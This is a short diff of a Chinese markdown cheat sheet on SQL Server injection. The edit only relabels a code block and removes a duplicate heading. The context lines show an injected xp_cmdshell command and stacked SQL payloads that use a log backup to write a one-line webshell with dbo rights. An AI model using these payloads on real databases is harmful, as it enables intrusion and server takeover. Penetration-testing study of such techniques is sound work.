@@ -182,7 +182,7 @@ exec master.dbo.xp_cmdshell username;--
 
   找到web目录后，即可写入一句话木马(dbo权限)
 
-  ``` mssql
+  ``` sql
   ;alter database news set RECOVERY FULL 
   ;create table test(str image)-- 
   ;backup log news to disk='c:\test' with init-- 
@@ -208,4 +208,3 @@ exec master.dbo.xp_cmdshell username;--
 
 #### sqlserver差异备份、完全备份、权限入侵
 
-#### sqlserver差异备份、完全备份、权限入侵
